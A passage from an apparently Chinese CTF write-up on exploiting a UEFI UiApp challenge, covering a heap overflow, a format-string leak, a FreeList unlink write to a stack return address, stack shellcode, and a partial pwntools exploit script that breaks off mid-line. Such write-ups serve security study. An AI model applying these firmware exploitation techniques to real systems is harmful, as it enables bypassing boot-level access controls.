class="type">void</span> (__fastcall *)(__int64, __int64, info **))gBS-&gt;AllocatePool)(<span class="number">0xA</span>i64, <span class="number">0x58</span>i64, &amp;info);</span><br><span class="line">  init_info(&amp;info, &amp;word_8);</span><br><span class="line">  info-&gt;ID = USER-&gt;ID;</span><br><span class="line">  Name = USER-&gt;Name;</span><br><span class="line">  <span class="keyword">if</span> ( Name )</span><br><span class="line">  &#123;</span><br><span class="line">    StrLength = <span class="number">0x18</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    Name = <span class="string">&quot;Anonymous&quot;</span>;</span><br><span class="line">    StrLength = GetStrLength(<span class="string">&quot;Anonymous&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;Name, Name, StrLength);</span><br><span class="line">  Desc = USER-&gt;Desc;</span><br><span class="line">  <span class="keyword">if</span> ( Desc )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0x38</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    Desc = <span class="string">&quot;Nothing...&quot;</span>;</span><br><span class="line">    v3 = GetStrLength(<span class="string">&quot;Nothing...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;Desc, Desc, v3);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))gBS-&gt;FreePool)(USER-&gt;Name);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))gBS-&gt;FreePool)(USER-&gt;Desc);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(user *))gBS-&gt;FreePool)(USER);</span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  USER = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析与利用-1"><a href="#漏洞分析与利用-1" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h3><p>这道题有两个漏洞，第一个是在 Edit 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line">  v1 = inputNum();</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Desc: &quot;</span>);</span><br><span class="line">      Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">      DataSize = <span class="number">0x80</span>i64;  <span class="comment">// heap overflow</span></span><br><span class="line">      Desc = USER-&gt;Desc;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Output(<span class="string">&quot;N&quot;</span>);</span><br><span class="line">  Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">  DataSize = <span class="number">0x18</span>i64;</span><br><span class="line">  Desc = USER-&gt;Name;</span><br><span class="line">LABEL_12:</span><br><span class="line">  Unicode2Ascii(DataTempBuffer, Desc, DataSize);</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>当我们选择编辑 Desc 的时候我们最多可以输入 0x80 字节的数据，可是 Desc 的 size 为 0x38，这里就存在堆溢出。另外一个漏洞比较难找，就是在选择 role 为 Administrator 时输入用户名那里存在格式化字符串漏洞：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line">Input(AdministratorName, (<span class="type">int</span>)&amp;byte_40[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> ( checkUser(<span class="string">&quot;A&quot;</span>, AdministratorName) )</span><br><span class="line">&#123;</span><br><span class="line">Output(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">    SystemTable-&gt;ConOut,</span><br><span class="line">    <span class="number">4</span>i64);</span><br><span class="line">Output((<span class="type">unsigned</span> __int8 *)AdministratorName);  <span class="comment">// fmt</span></span><br><span class="line">((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">    SystemTable-&gt;ConOut,</span><br><span class="line">    <span class="number">15</span>i64);</span><br><span class="line">Output(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>这里的格式化字符串漏洞和我们平时 printf 的有点不一样，只能够通过多个 %p 进行信息的泄露，而且不能够像 printf 那样实现任意地址的读写。我们能够通过这个漏洞来获取到栈地址以及 UiApp 组件的基地址。  </p>
<p>有个需要注意的点是，在 Add 函数和 Edit 函数在进行堆块申请的时候 EFI_MEMORY_TYPE 都为 0，而在 SaveInfo 申请堆块的时候 EFI_MEMORY_TYPE 为 10。<br>由于在 UiApp 中并没有像平时 linux pwn 上的 got 表什么的，也没有 glibc 上面的各种 hook 和 IO，所以我们要像办法劫持栈上的返回地址。  </p>
<p>通过我们前面的分析，相同的 size 的堆块如果它的 EFI_MEMORY_TYPE 不同，那么他们就会给分配到不同的 POOL，如果我们可以通过 Desc 的溢出将 Name 的堆块给改了的话，那么在 free 的时候 Name 就会给分配到另外一个 POOL 的 FreeList 中。由于 Name 比 Desc 先申请，所以 Name 的地址在 Desc 的上方，可是 FreeList 是遵循后进先出的，所以我们可以通过释放 Name 和 Desc 再重新申请就能令 Desc 出现在 Name 的上方，然后通过溢出就能修改 Name 的 EFI_MEMORY_TYPE，最后将其释放链入到不同 POOL 的 FreeList[0] 中。这里需要注意的是我们的输入会出现 \x00 截断，所以我们的 payload 要分多段输入。其最终效果如下：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x2e352f00</span><br><span class="line">0x2e352f00:     0x0000000030726670      0x000000002e7c9e18  &lt;---- mPoolHead[0].FreeList[0]</span><br><span class="line">0x2e352f10:     0x000000002e7c9e18      0xafafafafafafafaf</span><br><span class="line">0x2e352f20:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f30:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f40:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f50:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f60:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f70:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f80:     0x0000000030726670      0x000000002e7ca728  &lt;---- mPoolHead[10].FreeList[0]</span><br><span class="line">0x2e352f90:     0x000000002e7ca728      0xafafafafafafafaf</span><br><span class="line">0x2e352fa0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352fb0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352fc0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352fd0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br></pre></td></tr></table></figure>

<p>接下来就要考虑如何覆盖栈上的返回地址，这里涉及到 FreeList 上堆块的脱链操作，其相关代码如下：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Removes a node from a doubly-linked list, and returns the node that follows</span></span><br><span class="line"><span class="comment">  the removed node.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Removes the node Entry from a doubly-linked list. It is up to the caller of</span></span><br><span class="line"><span class="comment">  this function to release the memory used by this node if that is required. On</span></span><br><span class="line"><span class="comment">  exit, the node following Entry in the doubly-linked list is returned. If</span></span><br><span class="line"><span class="comment">  Entry is the only node in the linked list, then the head node of the linked</span></span><br><span class="line"><span class="comment">  list is returned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  If Entry is NULL, then ASSERT().</span></span><br><span class="line"><span class="comment">  If Entry is the head node of an empty list, then ASSERT().</span></span><br><span class="line"><span class="comment">  If PcdMaximumLinkedListLength is not zero, and the number of nodes in the</span></span><br><span class="line"><span class="comment">  linked list containing Entry, including the Entry node, is greater than</span></span><br><span class="line"><span class="comment">  or equal to PcdMaximumLinkedListLength, then ASSERT().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param  Entry A pointer to a node in a linked list.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @return Entry.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line">LIST_ENTRY *</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">RemoveEntryList</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN      CONST LIST_ENTRY  *Entry</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  ASSERT (!IsListEmpty (Entry));</span><br><span class="line"></span><br><span class="line">  Entry-&gt;ForwardLink-&gt;BackLink = Entry-&gt;BackLink;</span><br><span class="line">  Entry-&gt;BackLink-&gt;ForwardLink = Entry-&gt;ForwardLink;</span><br><span class="line">  <span class="keyword">return</span> Entry-&gt;ForwardLink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，如果我们能够将下一个要申请出来的堆块的 BackLink 修改为栈上 ret 的地址，ForwardLink 上写上用于覆盖 ret 的地址，那么我们在申请出该堆块的时候就能够将 ret 所指向的地址的指修改为 ForwardLink 上的值。由于我们存在堆溢出漏洞，而且已经获取了 stack 和 UiApp 的地址，所以这个 ForwardLink 和 BackLink 指针的修改很容易实现。<br>由于 pwn() 的上层函数 _ModuleEntryPoint + 718 的位置会判断 pwn() 的返回值以决定是否进入 Boot Manager 交互界面，我们可以直接将程序劫持到这个地方。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)pwn() )</span><br><span class="line">&#123;</span><br><span class="line">v142 = <span class="number">0x800000000000000F</span>ui64;</span><br><span class="line">Output(<span class="string">L&quot;UiEntry: ACCESS DENIED!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sub_6107(<span class="number">1</span>i64, <span class="number">50659335</span>i64);</span><br><span class="line">sub_11117();</span><br><span class="line">sub_13FAC();</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>可是当我将 ForwardLink 直接修改为 UiApp 上对应的地址的时候却出现了报错：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">!!!! X64 Exception Type - 06(<span class="comment">#UD - Invalid Opcode)  CPU Apic ID - 00000000 !!!!</span></span><br><span class="line">RIP  - 00000000121B4982, CS  - 0000000000000038, RFLAGS - 0000000000000246</span><br><span class="line">RAX  - 0000000000000001, RCX - 00000000E7180001, RDX - 0000000003050007</span><br><span class="line">RBX  - 00000000121C7321, RSP - 00000000139AE720, RBP - 0000000000000001</span><br><span class="line">RSI  - 0000000012AEE9B7, RDI - 0000000000000000</span><br><span class="line">R8   - 0000000000000004, R9  - 00000000139AE507, R10 - 0000000000000000</span><br><span class="line">R11  - 0000000012A9DB5C, R12 - 0000000000000001, R13 - 00000000121DFA98</span><br><span class="line">R14  - 0000000000000001, R15 - 00000000121C8FA0</span><br><span class="line">DS   - 0000000000000030, ES  - 0000000000000030, FS  - 0000000000000030</span><br><span class="line">GS   - 0000000000000030, SS  - 0000000000000030</span><br><span class="line">CR0  - 0000000080010033, CR2 - 0000000000000000, CR3 - 0000000013601000</span><br><span class="line">CR4  - 0000000000000668, CR8 - 0000000000000000</span><br><span class="line">DR0  - 0000000000000000, DR1 - 0000000000000000, DR2 - 0000000000000000</span><br><span class="line">DR3  - 0000000000000000, DR6 - 00000000FFFF0FF0, DR7 - 0000000000000400</span><br><span class="line">GDTR - 00000000133DE000 0000000000000047, LDTR - 0000000000000000</span><br><span class="line">IDTR - 0000000013032018 0000000000000FFF,   TR - 0000000000000000</span><br><span class="line">FXSAVE_STATE - 00000000139AE380</span><br><span class="line">!!!! Find image based on IP(0x121B4982) (No PDB)  (ImageBase=00000000121A9000, EntryPoint=00000000121B352E) !!!!</span><br></pre></td></tr></table></figure>

<p>我将断点下在执行 ret 的那一步然后在gdb 上看 _ModuleEntryPoint + 718 对应的汇编，其值如下：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16i 0x273b4982</span><br><span class="line">   0x273b4982:  call   0x273af107</span><br><span class="line">   0x273b4987:  call   0xe53a117</span><br><span class="line">   0x273b498c:  stos   BYTE PTR es:[rdi],al</span><br><span class="line">   0x273b498d:  sub    BYTE PTR [rax],al</span><br><span class="line">   0x273b498f:  add    BYTE PTR [rax],al</span><br><span class="line">   0x273b4991:  add    BYTE PTR [rbx+0x14f3005],cl</span><br><span class="line">   0x273b4997:  add    BYTE PTR [rcx],dh</span><br><span class="line">   0x273b4999:  ror    BYTE PTR [rbp+rcx*4-0x7c],cl</span><br><span class="line">   0x273b499d:  and    al,0xb8</span><br><span class="line">   0x273b499f:  add    BYTE PTR [rax],al</span><br><span class="line">   0x273b49a1:  add    BYTE PTR [rax-0x73],cl</span><br><span class="line">   0x273b49a4:  or     eax,0x12757</span><br><span class="line">   0x273b49a9:  call   QWORD PTR [rax+0x140]</span><br><span class="line">   0x273b49af:  <span class="built_in">test</span>   rax,rax</span><br><span class="line">   0x273b49b2:  js     0x273b49e0</span><br><span class="line">   0x273b49b4:  mov    rax,QWORD PTR [rsp+0xb8]</span><br></pre></td></tr></table></figure>

<p>而在 IDA 中的汇编如下：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000B982                 call    sub_6107</span><br><span class="line">.text:000000000000B987                 call    sub_11117</span><br><span class="line">.text:000000000000B98C                 call    sub_13FAC</span><br><span class="line">.text:000000000000B991                 mov     rax, cs:gBS</span><br><span class="line">.text:000000000000B998                 xor     edx, edx</span><br><span class="line">.text:000000000000B99A                 lea     r8, [rsp+138h+var_80]</span><br><span class="line">.text:000000000000B9A2                 lea     rcx, unk_1E100</span><br><span class="line">.text:000000000000B9A9                 call    qword ptr [rax+140h]</span><br><span class="line">.text:000000000000B9AF                 <span class="built_in">test</span>    rax, rax</span><br><span class="line">.text:000000000000B9B2                 js      short loc_B9E0</span><br><span class="line">.text:000000000000B9B4                 mov     rax, [rsp+138h+var_80]</span><br></pre></td></tr></table></figure>

<p>然后我绞尽脑汁想了半天，期间还找了出题人问了一下，最后发现是一个很低级和基础的问题😇。可能是由于 qemu 的缘故或者是其他什么的原因，导致 UiApp 的 text 段可写，而堆块在脱链的过程中存在下面这一步：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Entry-&gt;ForwardLink-&gt;BackLink = Entry-&gt;BackLink;</span><br></pre></td></tr></table></figure>

<p>也就是说我们目标地址偏移为 8 的地方会给写入一个地址，这样子就导致我们 UiApp 的 text 段被修改，后面的操作就会出现错误。<br>我们观察到栈上可执行，所以我们可以在栈上写入 shellcode 然后将 ret 覆盖为 shellocde 的地址，其 shellcode 如下：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    jmp WIN;</span><br><span class="line">    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;</span><br><span class="line">    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;</span><br><span class="line">WIN:</span><br><span class="line">    mov rax, uiapp_base + 0xb982;</span><br><span class="line">    jmp rax;</span><br></pre></td></tr></table></figure>

<p>中间的 0x90 是为了填充数据，在堆块脱链的时候这部分会给修改为一个地址，不过由于我们前面直接 jmp 到后面的关键代码去了，所以 shellcode 的执行不会受到影响。<br>shellcode 我们可以在选择 Administrator 用户登录输入 key 时将其保留到栈上。  </p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>和上面那题一样，由于 Boot Manager 是可视化界面，在 pwntools 上非常难看，所以这里使用 socat 连接。</p>
<h4 id="exp-sh-1"><a href="#exp-sh-1" class="headerlink" title="exp.sh"></a>exp.sh</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">socat $(<span class="built_in">tty</span>),<span class="built_in">echo</span>=0,escape=0x03 SYSTEM:<span class="string">&#x27;python3 ./exp.py&#x27;</span> 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h4 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;python3&#x27;</span>,<span class="string">&#x27;run.py&#x27;</span>])</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(1. Administrator 2. Visitor):&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(index).encode()+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(index).encode()+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,desc,<span class="built_in">id</span>=<span class="number">10</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;ID:&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="built_in">id</span>).encode()+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">    p.send(name+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Desc:&#x27;</span>)</span><br><span class="line">    p.send(desc+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">choice,msg</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    menu(choice)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">        p.send(msg+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Desc:&#x27;</span>)</span><br><span class="line">        p.send(msg+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enterOS</span>():</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">key_map = &#123;</span><br><span class="line">    <span class="string">b&quot;up&quot;</span>:    <span class="string">b&quot;\x1b[A&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;down&quot;</span>:  <span class="string">b&quot;\x1b[B&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;left&quot;</span>:  <span class="string">b&quot;\x1b[D&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;right&quot;</span>: <span class="string">b&quot;\x1b[C&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;esc&quot;</span>:   <span class="string">b&quot;\x1b^[&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;enter&quot;</span>: <span class="string">b&quot;\r&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;tab&quot;</span>:   <span class="string">b&quot;\t&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_key</span>(<span class="params">key,times = <span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        p.send(key_map[key])</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">b&quot;enter&quot;</span>:</span><br><span class="line">            p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;\x1b[24~&quot;</span>*<span class="number">10</span>)</span><br><span class="line">role(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Username:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;User [&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">stack = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;.&quot;</span>, 